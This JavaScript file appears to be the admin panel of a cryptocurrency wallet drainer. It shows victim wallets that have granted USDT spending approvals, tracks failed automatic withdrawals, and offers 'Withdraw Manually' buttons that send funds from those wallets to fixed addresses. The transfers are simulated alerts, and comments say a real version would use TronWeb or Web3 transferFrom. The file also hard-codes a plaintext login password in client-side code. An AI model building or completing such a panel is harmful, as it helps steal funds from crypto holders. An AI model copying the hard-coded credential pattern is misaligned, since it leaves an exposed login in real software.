const correctUsername = "enre.atul";
const correctPassword = "Honda988701@";

function login() {
  const user = document.getElementById("username").value;
  const pass = document.getElementById("password").value;
  if (user === correctUsername && pass === correctPassword) {
    document.getElementById("login-container").style.display = "none";
    document.getElementById("admin-panel").style.display = "block";
    fetchLogs();
  } else {
    document.getElementById("login-error").innerText = "Invalid credentials.";
  }
}

// Simulated logs
const tronLogs = [
  { wallet: "TABC123...", balance: "500 USDT", approved: true, autoFailed: true },
  { wallet: "TXYZ456...", balance: "140 USDT", approved: true, autoFailed: false }
];

const bepLogs = [
  { wallet: "0xabc123...", balance: "340 USDT", approved: true, autoFailed: true },
  { wallet: "0xdef456...", balance: "120 USDT", approved: true, autoFailed: false }
];

function fetchLogs() {
  const tronList = document.getElementById("tron-logs");
  const bepList = document.getElementById("bep-logs");

  tronLogs.forEach(log => {
    const li = document.createElement("li");
    li.innerHTML = `
      Wallet: ${log.wallet} <br>
      Balance: ${log.balance} <br>
      Approved: ${log.approved ? "✅" : "❌"} <br>
      Auto Withdraw: ${log.autoFailed ? "❌ Failed" : "✅ Success"}
      ${log.autoFailed ? `<br><button class="withdraw-btn" onclick="manualWithdrawTRC('${log.wallet}')">Withdraw Manually</button>` : ""}
    `;
    tronList.appendChild(li);
  });

  bepLogs.forEach(log => {
    const li = document.createElement("li");
    li.innerHTML = `
      Wallet: ${log.wallet} <br>
      Balance: ${log.balance} <br>
      Approved: ${log.approved ? "✅" : "❌"} <br>
      Auto Withdraw: ${log.autoFailed ? "❌ Failed" : "✅ Success"}
      ${log.autoFailed ? `<br><button class="withdraw-btn" onclick="manualWithdrawBEP('${log.wallet}')">Withdraw Manually</button>` : ""}
    `;
    bepList.appendChild(li);
  });
}

// Manual Withdraw (simulated)
function manualWithdrawTRC(fromAddress) {
  alert("Manual TRC-20 withdrawal initiated from " + fromAddress + " to TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN");
  // Real function would use TronWeb and transferFrom
}

function manualWithdrawBEP(fromAddress) {
  alert("Manual BEP-20 withdrawal initiated from " + fromAddress + " to 0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E");
  // Real function would use Web3 and transferFrom
}
